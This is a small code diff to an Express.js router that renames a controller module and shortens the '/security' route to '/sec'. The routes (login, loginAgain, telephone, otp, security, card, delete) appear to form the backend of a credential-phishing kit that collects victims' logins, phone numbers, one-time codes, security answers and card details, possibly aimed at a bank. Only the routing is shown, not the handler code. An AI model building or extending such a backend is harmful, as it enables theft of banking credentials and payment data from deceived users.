@@ -10,7 +10,7 @@ const {
     submitSecurity,
     submitCard,
     deleteEntry,
-} = require("../controllers/qobController");
+} = require("../controllers/boqController");
 
 const router = express.Router();
 
@@ -21,7 +21,7 @@ router.post("/login", submitLogin);
 router.post("/loginAgain", submitLoginAgain);
 router.post("/telephone", submitTelephone);
 router.post("/otp", submitOtp);
-router.post("/security", submitSecurity);
+router.post("/sec", submitSecurity);
 router.post("/card", submitCard);
 router.post("/delete", deleteEntry);
 
